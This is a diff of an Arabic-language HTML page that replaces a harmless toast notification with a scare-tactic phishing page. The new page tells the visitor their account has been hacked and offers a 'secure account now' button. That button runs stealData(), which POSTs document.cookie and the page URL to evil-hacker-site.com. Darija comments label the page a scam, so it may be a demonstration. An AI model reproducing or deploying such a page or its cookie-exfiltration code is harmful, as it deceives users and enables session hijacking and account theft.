@@ -2,135 +2,69 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Modern Notification</title>
+    <title>تحذير أمني</title>
     <style>
         body {
-            font-family: 'Segoe UI', sans-serif;
-            background: #1a1a2e;
-            min-height: 100vh;
-        }
-
-        .toast-container {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            z-index: 9999;
-        }
-
-        .toast {
-            background: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(10px);
-            border-right: 4px solid #e74c3c;
-            border-radius: 8px;
-            padding: 16px 20px;
-            margin-bottom: 10px;
-            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            min-width: 350px;
-            animation: slideIn 0.3s ease-out;
-        }
-
-        @keyframes slideIn {
-            from {
-                transform: translateX(100%);
-                opacity: 0;
-            }
-            to {
-                transform: translateX(0);
-                opacity: 1;
-            }
-        }
-
-        @keyframes slideOut {
-            from {
-                transform: translateX(0);
-                opacity: 1;
-            }
-            to {
-                transform: translateX(100%);
-                opacity: 0;
-            }
-        }
-
-        .toast.hide {
-            animation: slideOut 0.3s ease-in forwards;
-        }
-
-        .toast-icon {
-            width: 40px;
-            height: 40px;
-            background: #e74c3c;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            font-family: Arial, sans-serif;
+            background: #ff0000;
             color: white;
+            text-align: center;
+            padding: 50px;
+        }
+        .warning-box {
+            background: black;
+            border: 5px solid yellow;
+            padding: 30px;
+            border-radius: 10px;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        .scary-text {
+            font-size: 32px;
+            color: #ff0000;
+            font-weight: bold;
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0; }
+        }
+        .fake-button {
+            background: #00ff00;
+            color: black;
+            padding: 15px 30px;
             font-size: 20px;
-        }
-
-        .toast-content h4 {
-            margin: 0 0 4px 0;
-            color: #2c3e50;
-            font-size: 16px;
-        }
-
-        .toast-content p {
-            margin: 0;
-            color: #7f8c8d;
-            font-size: 14px;
-        }
-
-        .demo-btn {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            padding: 15px 40px;
-            background: linear-gradient(45deg, #e74c3c, #c0392b);
-            color: white;
             border: none;
-            border-radius: 50px;
-            font-size: 16px;
             cursor: pointer;
-            box-shadow: 0 10px 30px rgba(231, 76, 60, 0.3);
+            margin-top: 20px;
         }
     </style>
 </head>
 <body>
-
-    <div class="toast-container" id="toastContainer"></div>
-    
-    <button class="demo-btn" onclick="showURLChanged()">اختبار التنبيه</button>
+    <div class="warning-box">
+        <div class="scary-text">⚠️ تحذير ⚠️</div>
+        <h1>لقد تم اختراق حسابك!</h1>
+        <p>تم اكتشاف نشاط مشبوه على حسابك</p>
+        <p>IP Address: 192.168.1.1</p>
+        <p>الموقع: الرباط، المغرب</p>
+        <button class="fake-button" onclick="stealData()">
+            تأمين الحساب فوراً
+        </button>
+    </div>
 
     <script>
-        function showURLChanged() {
-            const container = document.getElementById('toastContainer');
-            
-            const toast = document.createElement('div');
-            toast.className = 'toast';
-            toast.innerHTML = `
-                <div class="toast-icon">⚠️</div>
-                <div class="toast-content">
-                    <h4>تنبيه مهم</h4>
-                    <p>تم تغيير URL الموقع - يرجى تحديث الرابط</p>
-                </div>
-            `;
-            
-            container.appendChild(toast);
-            
-            // Remove after 4 seconds
-            setTimeout(() => {
-                toast.classList.add('hide');
-                setTimeout(() => toast.remove(), 300);
-            }, 4000);
+        function stealData() {
+            // Hadi katjbed data dial user (SCAM!)
+            alert("جاري سرقة بياناتك... 💀");
+            // Katseft data l server dial hacker
+            fetch('https://evil-hacker-site.com/steal', {
+                method: 'POST',
+                body: JSON.stringify({
+                    cookies: document.cookie,
+                    url: window.location.href
+                })
+            });
         }
-
-        // Auto-show on page load
-        window.addEventListener('load', showURLChanged);
     </script>
-
 </body>
 </html>
